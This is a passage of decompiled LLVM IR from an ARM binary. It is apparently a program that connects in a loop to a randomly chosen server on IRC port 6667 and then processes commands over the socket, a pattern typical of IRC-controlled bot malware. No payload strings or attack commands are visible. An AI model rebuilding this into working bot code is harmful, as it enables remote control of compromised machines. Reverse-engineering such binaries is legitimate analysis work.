  %stack_var_-28.316 = phi i8* [ %v3_ba54, %dec_label_pc_ba54 ], [ %v5_bab8, %dec_label_pc_bad4 ]
  %stack_var_-36.315 = phi i32 [ 0, %dec_label_pc_ba54 ], [ %stack_var_-36.2, %dec_label_pc_bad4 ]
  br label %dec_label_pc_ba88

dec_label_pc_baf8:                                ; preds = %dec_label_pc_bb1c
  %v1_bafc = add i32 %storemerge11, 1
  br label %dec_label_pc_bb04

dec_label_pc_bb04:                                ; preds = %dec_label_pc_bad4, %dec_label_pc_baf8
  %storemerge11 = phi i32 [ %v1_bafc, %dec_label_pc_baf8 ], [ 0, %dec_label_pc_bad4 ]
  store i32 %storemerge11, i32* @r4, align 4
  store i32 %v1_bab4, i32* @r0, align 4
  %v0_bb0c = call i32 @function_ecc0()
  %v0_bb14 = load i32, i32* @r4, align 4
  %v3_bb14 = icmp ult i32 %v0_bb14, %v0_bb0c
  br i1 %v3_bb14, label %dec_label_pc_bb1c, label %dec_label_pc_bb04.dec_label_pc_bb38_crit_edge

dec_label_pc_bb04.dec_label_pc_bb38_crit_edge:    ; preds = %dec_label_pc_bb04
  %.pre29 = add i32 %storemerge11, %v1_bab4
  %.pre30 = inttoptr i32 %.pre29 to i8*
  br label %dec_label_pc_bb38

dec_label_pc_bb1c:                                ; preds = %dec_label_pc_bb04
  %v2_bb28 = add i32 %storemerge11, %v1_bab4
  %v1_bb2c = inttoptr i32 %v2_bb28 to i8*
  %v2_bb2c = load i8, i8* %v1_bb2c, align 1
  %v7_bb30 = icmp eq i8 %v2_bb2c, 32
  br i1 %v7_bb30, label %dec_label_pc_bb38, label %dec_label_pc_baf8

dec_label_pc_bb38:                                ; preds = %dec_label_pc_bb1c, %dec_label_pc_bb04.dec_label_pc_bb38_crit_edge
  %v3_bb4c.pre-phi = phi i8* [ %.pre30, %dec_label_pc_bb04.dec_label_pc_bb38_crit_edge ], [ %v1_bb2c, %dec_label_pc_bb1c ]
  store i8 0, i8* %v3_bb4c.pre-phi, align 1
  store i32 %v1_bab4, i32* @r0, align 4
  %v2_bb54 = call i32 @function_f3c0(i32 %v1_bab4)
  %v5_bb5c = trunc i32 %v2_bb54 to i8
  store i8 %v5_bb5c, i8* %stack_var_-40, align 1
  %v3_bb64 = icmp eq i8 %v5_bb5c, -1
  br i1 %v3_bb64, label %dec_label_pc_bb6c, label %dec_label_pc_bbc8

dec_label_pc_bb6c:                                ; preds = %dec_label_pc_bb38
  %v2_bb70 = call i32 @function_f3e4(i32 %v1_bab4)
  %v2_bb80 = icmp eq i32 %v2_bb70, 0
  br i1 %v2_bb80, label %dec_label_pc_bb88, label %dec_label_pc_bba4

dec_label_pc_bb88:                                ; preds = %dec_label_pc_bb6c
  %v2_bb8c = load i32, i32* @global_var_1ad08.185, align 4
  store i32 %v2_bb8c, i32* @r2, align 4
  %v3_bb9c = call i32 @function_8374(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_16574.222 to i32))
  br label %dec_label_pc_bc24

dec_label_pc_bba4:                                ; preds = %dec_label_pc_bb6c
  %v2_bba4 = ptrtoint i8* %stack_var_-40 to i32
  %v1_bbac = add i32 %v2_bb70, 16
  %v2_bbac = inttoptr i32 %v1_bbac to i32*
  %v3_bbac = load i32, i32* %v2_bbac, align 4
  %v1_bbb0 = inttoptr i32 %v3_bbac to i32*
  %v2_bbb0 = load i32, i32* %v1_bbb0, align 4
  store i32 %v2_bbb0, i32* @r1, align 4
  %v1_bbb8 = add i32 %v2_bb70, 12
  %v2_bbb8 = inttoptr i32 %v1_bbb8 to i32*
  %v3_bbb8 = load i32, i32* %v2_bbb8, align 4
  store i32 %v2_bba4, i32* @r0, align 4
  store i32 %v3_bbb8, i32* @r2, align 4
  %v0_bbc4 = call i32 @function_ec10()
  %v2_bbd4.pre = load i8, i8* %stack_var_-40, align 1
  br label %dec_label_pc_bbc8

dec_label_pc_bbc8:                                ; preds = %dec_label_pc_bb38, %dec_label_pc_bba4
  %v12_bc2825 = phi i32 [ %v0_bbc4, %dec_label_pc_bba4 ], [ %v2_bb54, %dec_label_pc_bb38 ]
  %v2_bbd4 = phi i8 [ %v2_bbd4.pre, %dec_label_pc_bba4 ], [ %v5_bb5c, %dec_label_pc_bb38 ]
  store i8 %v2_bbd4, i8* bitcast (i8** @global_var_1847b.224 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_18478.33 to i8*), align 4
  store i32 256, i32* @global_var_1847c.35, align 4
  br label %dec_label_pc_bc24

dec_label_pc_bc24:                                ; preds = %dec_label_pc_b984, %dec_label_pc_bab0, %dec_label_pc_ba44, %dec_label_pc_ba0c, %dec_label_pc_bb88, %dec_label_pc_bbc8
  %v12_bc28 = phi i32 [ 0, %dec_label_pc_ba44 ], [ %v4_ba34, %dec_label_pc_ba0c ], [ %v3_bb9c, %dec_label_pc_bb88 ], [ %v12_bc2825, %dec_label_pc_bbc8 ], [ %v0_bac4, %dec_label_pc_bab0 ], [ %v0_b998, %dec_label_pc_b984 ]
  ret i32 %v12_bc28

; uselistorder directives
  uselistorder i32 %storemerge11, { 1, 0, 3, 2 }
  uselistorder i32 %v1_bad8, { 1, 0 }
  uselistorder i32 %v1_bab4, { 2, 4, 3, 0, 1, 5, 6 }
  uselistorder i8* %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %stack_var_-36.2, { 2, 0, 1, 3 }
  uselistorder i32 %storemerge9, { 1, 0, 3, 2 }
  uselistorder i32 %v1_b9ac, { 1, 0 }
  uselistorder i8* %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %stack_var_-36.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** %stack_var_-52, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_18478.33, { 0, 1, 4, 3, 2 }
  uselistorder i32* @global_var_1847c.35, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder label %dec_label_pc_bc24, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_bbc8, { 1, 0 }
  uselistorder label %dec_label_pc_bb04, { 1, 0 }
  uselistorder label %dec_label_pc_ba88.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_bab0, { 1, 0 }
  uselistorder label %dec_label_pc_b9d8, { 1, 0 }
  uselistorder label %dec_label_pc_b95c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_b984, { 1, 0 }
}

define i32 @function_bc40(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_bc40:
  %stack_var_-4 = alloca i32, align 4
  store i32 48204, i32* %stack_var_-4, align 4
  %v2_bc48 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_bc48, i32* @fp, align 4
  %v2_bc60 = load i32, i32* @global_var_1abf4.187, align 4
  %v1_bc68 = call i32 @function_fa5c(i32 %v2_bc60)
  %v0_bc6c = call i32 @function_8688()
  store i32 %v0_bc6c, i32* @global_var_1abf4.187, align 4
  ret i32 %v0_bc6c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_bc88(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_bc88:
  %stack_var_-36 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_-36, align 4
  br label %dec_label_pc_bcbc

dec_label_pc_bcb0:                                ; preds = %dec_label_pc_bcd4
  %v1_bcb4 = add i32 %storemerge2, 1
  br label %dec_label_pc_bcbc

dec_label_pc_bcbc:                                ; preds = %dec_label_pc_bc88, %dec_label_pc_bcb0
  %storemerge2 = phi i32 [ 0, %dec_label_pc_bc88 ], [ %v1_bcb4, %dec_label_pc_bcb0 ]
  store i32 %storemerge2, i32* @r4, align 4
  store i32 %arg2, i32* @r0, align 4
  %v0_bcc4 = call i32 @function_ecc0()
  %v0_bccc = load i32, i32* @r4, align 4
  %v3_bccc = icmp ult i32 %v0_bccc, %v0_bcc4
  br i1 %v3_bccc, label %dec_label_pc_bcd4, label %dec_label_pc_bcbc.dec_label_pc_bcf0_crit_edge

dec_label_pc_bcbc.dec_label_pc_bcf0_crit_edge:    ; preds = %dec_label_pc_bcbc
  %.pre = add i32 %storemerge2, %arg2
  %.pre6 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_bcf0

dec_label_pc_bcd4:                                ; preds = %dec_label_pc_bcbc
  %v2_bce0 = add i32 %storemerge2, %arg2
  %v1_bce4 = inttoptr i32 %v2_bce0 to i8*
  %v2_bce4 = load i8, i8* %v1_bce4, align 1
  %v7_bce8 = icmp eq i8 %v2_bce4, 33
  br i1 %v7_bce8, label %dec_label_pc_bcf0, label %dec_label_pc_bcb0

dec_label_pc_bcf0:                                ; preds = %dec_label_pc_bcd4, %dec_label_pc_bcbc.dec_label_pc_bcf0_crit_edge
  %v3_bd04.pre-phi = phi i8* [ %.pre6, %dec_label_pc_bcbc.dec_label_pc_bcf0_crit_edge ], [ %v1_bce4, %dec_label_pc_bcd4 ]
  store i8 0, i8* %v3_bd04.pre-phi, align 1
  %v2_bd0c = load i32, i32* @global_var_1abf4.187, align 4
  %v2_bd18 = inttoptr i32 %arg2 to i8*
  %v3_bd18 = call i32 @function_f0f4(i8* %v2_bd18, i32 %v2_bd0c)
  %v2_bd20 = icmp eq i32 %v3_bd18, 0
  br i1 %v2_bd20, label %dec_label_pc_bd28, label %dec_label_pc_bd7c

dec_label_pc_bd28:                                ; preds = %dec_label_pc_bcf0
  %v3_bd28 = load i8*, i8** %stack_var_-36, align 4
  %v2_bd2c = load i8, i8* %v3_bd28, align 1
  %v7_bd30 = icmp eq i8 %v2_bd2c, 58
  br i1 %v7_bd30, label %dec_label_pc_bd38, label %dec_label_pc_bd44

dec_label_pc_bd38:                                ; preds = %dec_label_pc_bd28
  %v4_bd28 = ptrtoint i8* %v3_bd28 to i32
  %v1_bd3c = add i32 %v4_bd28, 1
  %v5_bd40 = inttoptr i32 %v1_bd3c to i8*
  store i8* %v5_bd40, i8** %stack_var_-36, align 4
  br label %dec_label_pc_bd44

dec_label_pc_bd44:                                ; preds = %dec_label_pc_bd28, %dec_label_pc_bd38
  %v3_bd644 = phi i8* [ %v3_bd28, %dec_label_pc_bd28 ], [ %v5_bd40, %dec_label_pc_bd38 ]
  %v2_bd48 = load i32, i32* @global_var_1abf4.187, align 4
  %v2_bd4c = icmp eq i32 %v2_bd48, 0
  br i1 %v2_bd4c, label %dec_label_pc_bd64, label %dec_label_pc_bd54

dec_label_pc_bd54:                                ; preds = %dec_label_pc_bd44
  %v1_bd60 = call i32 @function_fa5c(i32 %v2_bd48)
  %v3_bd64.pre = load i8*, i8** %stack_var_-36, align 4
  br label %dec_label_pc_bd64

dec_label_pc_bd64:                                ; preds = %dec_label_pc_bd44, %dec_label_pc_bd54
  %v3_bd64 = phi i8* [ %v3_bd644, %dec_label_pc_bd44 ], [ %v3_bd64.pre, %dec_label_pc_bd54 ]
  %v4_bd64 = ptrtoint i8* %v3_bd64 to i32
  %v2_bd68 = call i32 @function_f170(i32 %v4_bd64)
  store i32 %v2_bd68, i32* @global_var_1abf4.187, align 4
  br label %dec_label_pc_bd7c

dec_label_pc_bd7c:                                ; preds = %dec_label_pc_bcf0, %dec_label_pc_bd64
  %v12_bd80 = phi i32 [ %v3_bd18, %dec_label_pc_bcf0 ], [ %v2_bd68, %dec_label_pc_bd64 ]
  ret i32 %v12_bd80

; uselistorder directives
  uselistorder i8* %v3_bd28, { 0, 2, 1 }
  uselistorder i32 %storemerge2, { 1, 0, 3, 2 }
  uselistorder i8** %stack_var_-36, { 0, 3, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_bd7c, { 1, 0 }
  uselistorder label %dec_label_pc_bd64, { 1, 0 }
  uselistorder label %dec_label_pc_bd44, { 1, 0 }
  uselistorder label %dec_label_pc_bcbc, { 1, 0 }
}

define i32 @function_bd88() local_unnamed_addr {
dec_label_pc_bd88:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_bd8c = load i32, i32* @fp, align 4
  store i32 48532, i32* %stack_var_-4, align 4
  %v2_bd90 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_bd90, i32* @fp, align 4
  %v2_beb8 = ptrtoint i32* %stack_var_-40 to i32
  %v2_bf24 = ptrtoint i32* %stack_var_-48 to i32
  %v3_bf74 = bitcast i32* %stack_var_-44 to %sockaddr*
  br label %dec_label_pc_bd9c

dec_label_pc_bd9c:                                ; preds = %dec_label_pc_bd9c.backedge, %dec_label_pc_bd88
  store i32 -1, i32* @global_var_1abf8.25, align 4
  store i32 1, i32* %stack_var_-48, align 4
  %v2_bdb4 = load i32, i32* @global_var_18470.144, align 4
  %v2_bdb8 = icmp eq i32 %v2_bdb4, 0
  br i1 %v2_bdb8, label %dec_label_pc_bdc0, label %dec_label_pc_bdf4

dec_label_pc_bdc0:                                ; preds = %dec_label_pc_bd9c
  %v0_bdc0 = call i32 @function_fe50()
  %v2_bdcc = load i32, i32* @global_var_18024.232, align 4
  %v2_bdd8 = call i32 @function_c930(i32 %v0_bdc0, i32 %v2_bdcc)
  %v4_bde8 = mul i32 %v2_bdd8, 4
  %v5_bde8 = add i32 %v4_bde8, ptrtoint ([16 x i8]** @global_var_18028.235 to i32)
  %v6_bde8 = inttoptr i32 %v5_bde8 to i32*
  %v7_bde8 = load i32, i32* %v6_bde8, align 4
  store i32 %v7_bde8, i32* @global_var_1ad00.142, align 4
  br label %dec_label_pc_bdf4

dec_label_pc_bdf4:                                ; preds = %dec_label_pc_bd9c, %dec_label_pc_bdc0
  store i32 0, i32* @global_var_18470.144, align 4
  br label %dec_label_pc_be00

dec_label_pc_be00:                                ; preds = %dec_label_pc_be00, %dec_label_pc_bdf4
  %v3_be0c = call i32 @function_f8dc(i32 2, i32 1, i32 6)
  store i32 %v3_be0c, i32* @global_var_1abf8.25, align 4
  %v1_be24 = icmp slt i32 %v3_be0c, 0
  br i1 %v1_be24, label %dec_label_pc_be00, label %dec_label_pc_be2c

dec_label_pc_be2c:                                ; preds = %dec_label_pc_be00
  %v2_be30 = load i32, i32* @global_var_1ad00.142, align 4
  store i32 %v2_be30, i32* @r0, align 4
  %v1_be38 = call i32 @function_f3c0(i32 %v2_be30)
  %v2_be40 = icmp eq i32 %v1_be38, 0
  br i1 %v2_be40, label %dec_label_pc_be64, label %dec_label_pc_be48

dec_label_pc_be48:                                ; preds = %dec_label_pc_be2c
  %v2_be4c = load i32, i32* @global_var_1ad00.142, align 4
  store i32 %v2_be4c, i32* @r0, align 4
  %v1_be54 = call i32 @function_f3c0(i32 %v2_be4c)
  %v3_be5c = icmp eq i32 %v1_be54, -1
  br i1 %v3_be5c, label %dec_label_pc_be64, label %dec_label_pc_bed8

dec_label_pc_be64:                                ; preds = %dec_label_pc_be48, %dec_label_pc_be2c
  %v2_be68 = load i32, i32* @global_var_1ad00.142, align 4
  %v1_be70 = call i32 @function_f3e4(i32 %v2_be68)
  %v2_be80 = icmp eq i32 %v1_be70, 0
  br i1 %v2_be80, label %dec_label_pc_be88, label %dec_label_pc_bea8

dec_label_pc_be88:                                ; preds = %dec_label_pc_be64
  store i32 0, i32* @global_var_1ad00.142, align 4
  %v2_be98 = load i32, i32* @global_var_1abf8.25, align 4
  %v1_bea0 = call i32 @function_ca18(i32 %v2_be98)
  br label %dec_label_pc_bd9c.backedge

dec_label_pc_bd9c.backedge:                       ; preds = %dec_label_pc_be88, %dec_label_pc_c058
  br label %dec_label_pc_bd9c

dec_label_pc_bea8:                                ; preds = %dec_label_pc_be64
  %v1_beac = add i32 %v1_be70, 16
  %v2_beac = inttoptr i32 %v1_beac to i32*
  %v3_beac = load i32, i32* %v2_beac, align 4
  %v1_beb0 = inttoptr i32 %v3_beac to i32*
  %v2_beb0 = load i32, i32* %v1_beb0, align 4
  %v1_bec0 = add i32 %v1_be70, 12
  %v2_bec0 = inttoptr i32 %v1_bec0 to i32*
  %v3_bec0 = load i32, i32* %v2_bec0, align 4
  store i32 %v3_bec0, i32* @r2, align 4
  %v3_bed0 = call i32 @function_ec00(i32 %v2_beb0, i32 %v2_beb8, i32 %v3_bec0)
  br label %dec_label_pc_bef0

dec_label_pc_bed8:                                ; preds = %dec_label_pc_be48
  %v2_bedc = load i32, i32* @global_var_1ad00.142, align 4
  store i32 %v2_bedc, i32* @r0, align 4
  %v1_bee4 = call i32 @function_f3c0(i32 %v2_bedc)
  store i32 %v1_bee4, i32* %stack_var_-40, align 4
  br label %dec_label_pc_bef0

dec_label_pc_bef0:                                ; preds = %dec_label_pc_bea8, %dec_label_pc_bed8
  store i32 2, i32* %stack_var_-44, align 4
  %v1_bf08 = call i32 @function_f294(i32 6667)
  %v2_bf20 = load i32, i32* @global_var_1abf8.25, align 4
  store i32 %v2_bf20, i32* @r3, align 4
  %v3_bf34 = call i32 @function_cac8(i32 %v2_bf20, i32 21537, i32 %v2_bf24)
  %v2_bf3c = call i32 @function_cb74(i32* null)
  br label %dec_label_pc_c038

dec_label_pc_bf4c:                                ; preds = %dec_label_pc_c038
  %v0_bf4c = call i32 @function_cc08()
  %v2_bf58 = inttoptr i32 %v0_bf4c to i32*
  store i32 0, i32* %v2_bf58, align 4
  %v2_bf60 = load i32, i32* @global_var_1abf8.25, align 4
  %v4_bf74 = call i32 @function_f7f4(i32 %v2_bf60, %sockaddr* %v3_bf74, i32 16)
  %v2_bf7c = icmp eq i32 %v4_bf74, 0
  br i1 %v2_bf7c, label %dec_label_pc_bf98, label %dec_label_pc_bf84

dec_label_pc_bf84:                                ; preds = %dec_label_pc_bf4c
  %v0_bf84 = call i32 @function_cc08()
  %v1_bf8c = inttoptr i32 %v0_bf84 to i32*
  %v2_bf8c = load i32, i32* %v1_bf8c, align 4
  %v7_bf90 = icmp eq i32 %v2_bf8c, 106
  br i1 %v7_bf90, label %dec_label_pc_bf98, label %dec_label_pc_c008

dec_label_pc_bf98:                                ; preds = %dec_label_pc_bf84, %dec_label_pc_bf4c
  %v2_bf9c = load i32, i32* @global_var_1abf8.25, align 4
  %v6_bfb8 = call i32 @function_f8ac(i32 %v2_bf9c, i32 1, i32 13, i32* null, i32 0)
  %v2_bfc0 = load i32, i32* @global_var_1abf8.25, align 4
  %v6_bfdc = call i32 @function_f8ac(i32 %v2_bfc0, i32 1, i32 2, i32* null, i32 0)
  %v2_bfe4 = load i32, i32* @global_var_1abf8.25, align 4
  %v6_c000 = call i32 @function_f8ac(i32 %v2_bfe4, i32 1, i32 9, i32* null, i32 0)
  store i32 %v3_bd8c, i32* @fp, align 4
  ret i32 %v6_c000

dec_label_pc_c008:                                ; preds = %dec_label_pc_bf84
  %v0_c008 = call i32 @function_cc08()
  %v1_c010 = inttoptr i32 %v0_c008 to i32*
  %v2_c010 = load i32, i32* %v1_c010, align 4
  %v7_c014 = icmp eq i32 %v2_c010, 115
  br i1 %v7_c014, label %dec_label_pc_c030, label %dec_label_pc_c01c

dec_label_pc_c01c:                                ; preds = %dec_label_pc_c008
  %v0_c01c = call i32 @function_cc08()
  %v1_c024 = inttoptr i32 %v0_c01c to i32*
  %v2_c024 = load i32, i32* %v1_c024, align 4
  %v7_c028 = icmp eq i32 %v2_c024, 114
  br i1 %v7_c028, label %dec_label_pc_c030, label %dec_label_pc_c058

dec_label_pc_c030:                                ; preds = %dec_label_pc_c01c, %dec_label_pc_c008
  %v1_c034 = call i32 @function_10628(i32 1)
  br label %dec_label_pc_c038

dec_label_pc_c038:                                ; preds = %dec_label_pc_bef0, %dec_label_pc_c030
  %v2_c03c = call i32 @function_cb74(i32* null)
  %v2_c04c = sub i32 %v2_c03c, %v2_bf3c
  %tmp = icmp ult i32 %v2_c04c, 10
  br i1 %tmp, label %dec_label_pc_bf4c, label %dec_label_pc_c058

dec_label_pc_c058:                                ; preds = %dec_label_pc_c01c, %dec_label_pc_c038
  store i32 0, i32* @global_var_1ad00.142, align 4
  %v2_c068 = load i32, i32* @global_var_1abf8.25, align 4
  %v1_c070 = call i32 @function_ca18(i32 %v2_c068)
  br label %dec_label_pc_bd9c.backedge

; uselistorder directives
  uselistorder i32 %v3_bec0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32 (i32)* @function_f294, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_ec00, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_f3e4, { 3, 2, 1, 0 }
  uselistorder i32 ()* @function_fe50, { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_c058, { 1, 0 }
  uselistorder label %dec_label_pc_c038, { 1, 0 }
  uselistorder label %dec_label_pc_bef0, { 1, 0 }
  uselistorder label %dec_label_pc_bd9c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_bdf4, { 1, 0 }
}

define i32 @function_c094(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_c094:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-1480 = alloca i32, align 4
  %stack_var_-2504 = alloca i32, align 4
  %stack_var_-6600 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-456 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_c098 = load i32, i32* @r4, align 4
  store i32 %v3_c098, i32* %stack_var_-20, align 4
  store i32 49312, i32* %stack_var_-4, align 4
  %v16_c098 = ptrtoint i32* %stack_var_-20 to i32
  %v2_c09c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c09c, i32* @fp, align 4
  %v1_c0c4 = call i32 @function_ca44(i32 %v16_c098)
  %v2_c0cc = icmp eq i32 %v1_c0c4, 0
  br i1 %v2_c0cc, label %dec_label_pc_c0dc, label %dec_label_pc_c0d4

dec_label_pc_c0d4:                                ; preds = %dec_label_pc_c094
  %v1_c0d8 = call i32 @function_10500(i32 0)
  br label %dec_label_pc_c0dc

dec_label_pc_c0dc:                                ; preds = %dec_label_pc_c094, %dec_label_pc_c0d4
  %v2_c0ec = load i32, i32* %arg2, align 4
  store i32 %v2_c0ec, i32* @r4, align 4
  %v2_c100 = load i32, i32* %arg2, align 4
  store i32 %v2_c100, i32* @r0, align 4
  %v0_c108 = call i32 @function_ecc0()
  %v0_c110 = load i32, i32* @r4, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_165f4.238 to i32), i32* @r1, align 4
  %v4_c11c = call i32 @function_ee60(i32 %v0_c110, i32 ptrtoint ([6 x i8]* @global_var_165f4.238 to i32), i32 %v0_c108)
  br label %dec_label_pc_c19c

dec_label_pc_c12c:                                ; preds = %dec_label_pc_c19c
  %v3_c130 = mul i32 %storemerge11, 4
  %v2_c148 = add i32 %v3_c130, %tmp
  %v1_c14c = inttoptr i32 %v2_c148 to i32*
  %v2_c14c = load i32, i32* %v1_c14c, align 4
  store i32 %v2_c14c, i32* @r4, align 4
  %v2_c170 = load i32, i32* %v1_c14c, align 4
  store i32 %v2_c170, i32* @r0, align 4
  %v0_c178 = call i32 @function_ecc0()
  %v0_c180 = load i32, i32* @r4, align 4
  store i32 %v0_c178, i32* @r2, align 4
  %v2_c18c = inttoptr i32 %v0_c180 to i8*
  %v3_c18c = call i32 @function_ec20(i8* %v2_c18c, i32 0)
  %v1_c194 = add nuw i32 %storemerge11, 1
  br label %dec_label_pc_c19c

dec_label_pc_c19c:                                ; preds = %dec_label_pc_c0dc, %dec_label_pc_c12c
  %storemerge11 = phi i32 [ 1, %dec_label_pc_c0dc ], [ %v1_c194, %dec_label_pc_c12c ]
  %v5_c1b4 = icmp slt i32 %storemerge11, %arg1
  br i1 %v5_c1b4, label %dec_label_pc_c12c, label %dec_label_pc_c1b8

dec_label_pc_c1b8:                                ; preds = %dec_label_pc_c19c
  %v2_c1bc = call i32 @function_cb74(i32* null)
  store i32 %v2_c1bc, i32* @r4, align 4
  %v0_c1c4 = call i32 @function_ca70()
  %v0_c1cc = load i32, i32* @r4, align 4
  %v2_c1cc = xor i32 %v0_c1cc, %v0_c1c4
  store i32 %v2_c1cc, i32* @r4, align 4
  %v0_c1d0 = call i32 @function_ca9c()
  %v0_c1d8 = load i32, i32* @r4, align 4
  %v2_c1d8 = add i32 %v0_c1d8, %v0_c1d0
  %v1_c1e0 = call i32 @function_fff4(i32 %v2_c1d8)
  %v0_c1e4 = call i32 @function_8688()
  store i32 %v0_c1e4, i32* @global_var_1abf4.187, align 4
  %v0_c1f4 = call i32 @function_8688()
  store i32 %v0_c1f4, i32* @global_var_1abf0.41, align 4
  %v0_c204 = call i32 @function_8688()
  store i32 %v0_c204, i32* @global_var_1abfc.242, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_165fc.245 to i32), i32* @global_var_1ad08.185, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_16604.248 to i32), i32* @global_var_1ad04.211, align 4
  store i32 0, i32* @global_var_1ad00.142, align 4
  %v2_c27c = ptrtoint i32* %stack_var_-456 to i32
  %v2_c33c = ptrtoint i32* %stack_var_-328 to i32
  %v2_c55c = ptrtoint i32* %stack_var_-6600 to i32
  %v2_c598 = add i32 %v16_c098, -6580
  %v2_c654 = ptrtoint i32* %stack_var_-2504 to i32
  %v2_c708 = ptrtoint i32* %stack_var_-1480 to i32
  %v3_c7e0 = bitcast i32* %stack_var_-1480 to i8*
  br label %dec_label_pc_c23c

dec_label_pc_c23c:                                ; preds = %dec_label_pc_c2b8, %dec_label_pc_c54c, %dec_label_pc_c7d0, %dec_label_pc_c1b8
  %v0_c23c = call i32 @function_bd88()
  %v2_c244 = load i32, i32* @global_var_1abf8.25, align 4
  %v2_c24c = load i32, i32* @global_var_1abf4.187, align 4
  %v2_c254 = load i32, i32* @global_var_1abf0.41, align 4
  store i32 %v2_c254, i32* @lr, align 4
  store i32 %v2_c24c, i32* @r2, align 4
  %v3_c274 = call i32 @function_8374(i32 %v2_c244, i32 ptrtoint ([41 x i8]* @global_var_1660c.252 to i32))
  br label %dec_label_pc_c290.lr.ph

dec_label_pc_c290.lr.ph:                          ; preds = %dec_label_pc_c504, %dec_label_pc_c588, %dec_label_pc_c7f0, %dec_label_pc_c810, %dec_label_pc_c23c
  br label %dec_label_pc_c290

dec_label_pc_c290:                                ; preds = %dec_label_pc_c290.lr.ph, %dec_label_pc_c290
  %storemerge1225 = phi i32 [ 0, %dec_label_pc_c290.lr.ph ], [ %v1_c2a4, %dec_label_pc_c290 ]
  %v5_c29c = mul nuw nsw i32 %storemerge1225, 4
  %v6_c29c = add i32 %v5_c29c, %v2_c27c
  %v7_c29c = inttoptr i32 %v6_c29c to i32*
  store i32 0, i32* %v7_c29c, align 4
  %v1_c2a4 = add nuw nsw i32 %storemerge1225, 1
  %tmp62 = icmp ult i32 %v1_c2a4, 32
  br i1 %tmp62, label %dec_label_pc_c290, label %dec_label_pc_c2b8

dec_label_pc_c2b8:                                ; preds = %dec_label_pc_c290
  %v2_c2bc = load i32, i32* @global_var_1abf8.25, align 4
  %v3_c2c0 = udiv i32 %v2_c2bc, 32
  %v3_c2d4 = mul nuw nsw i32 %v3_c2c0, 4
  %v2_c2dc = add i32 %v3_c2d4, %v16_c098
  %v2_c2e0 = add i32 %v2_c2dc, -436
  %v1_c2e4 = inttoptr i32 %v2_c2e0 to i32*
  %v2_c2e4 = load i32, i32* %v1_c2e4, align 4
  %v1_c2f0 = urem i32 %v2_c2bc, 32
  %v6_c2f8 = shl i32 1, %v1_c2f0
  %v2_c2fc = or i32 %v2_c2e4, %v6_c2f8
  store i32 %v2_c2fc, i32* %v1_c2e4, align 4
  store i32 1200, i32* %stack_var_-328, align 4
  %v2_c330 = load i32, i32* @global_var_1abf8.25, align 4
  %v1_c334 = add i32 %v2_c330, 1
  %v5_c350 = call i32 @function_cb44(i32 %v1_c334, i32 %v2_c27c, i32 0, i32 0, i32 %v2_c33c)
  %tmp63 = icmp slt i32 %v5_c350, 1
  br i1 %tmp63, label %dec_label_pc_c23c, label %dec_label_pc_c4f0.preheader

dec_label_pc_c4f0.preheader:                      ; preds = %dec_label_pc_c2b8
  %v2_c4f493 = load i32, i32* @global_var_18480.29, align 4
  %v3_c4fc95 = icmp eq i32 %v2_c4f493, 0
  br i1 %v3_c4fc95, label %dec_label_pc_c504, label %dec_label_pc_c36c

dec_label_pc_c36c:                                ; preds = %dec_label_pc_c4e4, %dec_label_pc_c4f0.preheader
  %storemerge13102 = phi i32 [ %.pre120, %dec_label_pc_c4e4 ], [ 0, %dec_label_pc_c4f0.preheader ]
  %v3_c370 = mul i32 %storemerge13102, 4
  %v2_c37c = load i32, i32* @global_var_1ad0c.31, align 4
  %v2_c380 = add i32 %v2_c37c, %v3_c370
  %v1_c384 = inttoptr i32 %v2_c380 to i32*
  %v2_c384 = load i32, i32* %v1_c384, align 4
  store i32 %v2_c384, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v3_c394 = call i32 @function_cba0(i32 %v2_c384, i32 0, i32 1)
  %tmp64 = icmp slt i32 %v3_c394, 1
  %.pre120 = add i32 %storemerge13102, 1
  br i1 %tmp64, label %dec_label_pc_c4e4, label %dec_label_pc_c3fc.preheader

dec_label_pc_c3fc.preheader:                      ; preds = %dec_label_pc_c36c
  %v2_c40072 = load i32, i32* @global_var_18480.29, align 4
  %v3_c40874 = icmp ult i32 %.pre120, %v2_c40072
  %v3_c41475 = mul i32 %.pre120, 4
